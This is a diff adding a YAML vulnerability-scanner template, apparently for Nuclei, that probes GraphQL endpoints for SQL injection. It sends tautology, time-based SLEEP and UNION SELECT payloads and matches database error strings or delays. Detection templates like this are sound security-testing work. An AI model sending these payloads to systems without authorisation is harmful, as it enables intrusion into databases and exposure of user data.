@@ -1,0 +1,66 @@
+id: sqli-graphql-injection
+
+info:
+  name: SQL Injection via GraphQL Queries
+  author: security-researcher
+  severity: high
+  description: |
+    GraphQL 엔드포인트에서 발생하는 SQL 인젝션 취약점을 탐지합니다.
+    GraphQL 리졸버가 입력값을 SQL 쿼리로 직접 변환할 때 취약합니다.
+  tags: sqli,graphql,injection,api
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+      - "{{BaseURL}}/gql"
+      - "{{BaseURL}}/query"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      sqli:
+        - "1' OR '1'='1"
+        - "1 OR 1=1--"
+        - "1' AND SLEEP(5)--"
+        - "1 UNION SELECT NULL--"
+
+    body: |
+      {"query": "{ user(id: \"{{sqli}}\") { id name email } }"}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"query": "{ users(filter: { name: { contains: \"test'\" } }) { nodes { id name } } }"}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error"
+        case-insensitive: true
